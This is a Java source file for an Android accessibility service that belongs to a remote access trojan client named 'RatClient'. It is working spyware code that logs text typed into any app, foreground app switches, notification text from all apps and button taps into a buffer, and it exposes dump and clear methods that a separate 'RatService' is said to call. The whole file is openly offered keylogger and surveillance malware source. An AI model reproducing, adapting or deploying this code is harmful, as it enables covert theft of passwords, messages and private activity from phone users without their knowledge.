package io.github.ratclient;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

import java.util.ArrayDeque;
import java.util.Deque;

/**
 * RatAccessibilityService
 *
 * Captures:
 *  - Keystrokes / text input from any app
 *  - App switch events (foreground app monitor)
 *  - Notifications from all apps
 *  - Button/element clicks
 *
 * Enable via: Settings → Accessibility → [app name] → Turn On
 * RatService can read the buffer via static methods — no IPC needed.
 */
public class RatAccessibilityService extends AccessibilityService {

    // Singleton reference — RatService reads this directly
    public static volatile RatAccessibilityService instance;

    private static final int    MAX_LOG  = 1000;
    private static final Object LOCK     = new Object();

    // Ring buffer for keylog entries
    private static final Deque<String> keyLog = new ArrayDeque<>();

    // Last known state (fast reads without full dump)
    private static volatile String lastApp   = "";
    private static volatile String lastNotif = "";

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    @Override
    protected void onServiceConnected() {
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes =
              AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED          // keystrokes / input
            | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED       // app switch
            | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED // notifications
            | AccessibilityEvent.TYPE_VIEW_CLICKED;              // tap/click events
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags =
              AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);
    }

    @Override
    public void onInterrupt() { /* required override */ }

    // ── Event handler ─────────────────────────────────────────────────────────

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String pkg = event.getPackageName() != null
            ? event.getPackageName().toString() : "?";

        switch (event.getEventType()) {

            // ── Text input / keyboard ──────────────────────────────────────
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                if (!event.getText().isEmpty()) {
                    CharSequence text = event.getText().get(0);
                    if (text != null && text.length() > 0) {
                        addLog("[KEY][" + pkg + "] " + text.toString());
                    }
                }
                break;

            // ── App switch ────────────────────────────────────────────────
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                if (!pkg.equals(lastApp)) {
                    lastApp = pkg;
                    CharSequence cls = event.getClassName();
                    addLog("[APP] " + pkg
                        + (cls != null ? " / " + cls.toString() : ""));
                }
                break;

            // ── Notifications ─────────────────────────────────────────────
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                if (!event.getText().isEmpty()) {
                    CharSequence text = event.getText().get(0);
                    if (text != null && text.length() > 0) {
                        String entry = "[NOTIF][" + pkg + "] " + text.toString();
                        lastNotif = entry;
                        addLog(entry);
                    }
                }
                break;

            // ── Clicks ────────────────────────────────────────────────────
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                CharSequence desc = event.getContentDescription();
                CharSequence text = !event.getText().isEmpty() ? event.getText().get(0) : null;
                String label = desc != null ? desc.toString()
                             : text != null ? text.toString() : null;
                if (label != null && label.length() > 0) {
                    addLog("[TAP][" + pkg + "] " + label);
                }
                break;
        }
    }

    // ── Static API — called by RatService ────────────────────────────────────

    /** True if accessibility permission is granted and service is running. */
    public static boolean isEnabled() {
        return instance != null;
    }

    /** Full keylog dump as a single string. */
    public static String dumpLog() {
        synchronized (LOCK) {
            if (keyLog.isEmpty()) return "(empty — no input captured yet)";
            StringBuilder sb = new StringBuilder();
            for (String entry : keyLog) {
                sb.append(entry).append("\n");
            }
            return sb.toString();
        }
    }

    /** Clear the keylog buffer. */
    public static void clearLog() {
        synchronized (LOCK) {
            keyLog.clear();
        }
    }

    /** Last foreground app package name. */
    public static String getCurrentApp() {
        return lastApp.isEmpty() ? "(unknown)" : lastApp;
    }

    /** Last captured notification text. */
    public static String getLastNotification() {
        return lastNotif.isEmpty() ? "(none yet)" : lastNotif;
    }

    // ── Internal ─────────────────────────────────────────────────────────────

    private static void addLog(String entry) {
        synchronized (LOCK) {
            if (keyLog.size() >= MAX_LOG) keyLog.poll(); // drop oldest
            keyLog.offer(entry);
        }
    }
}
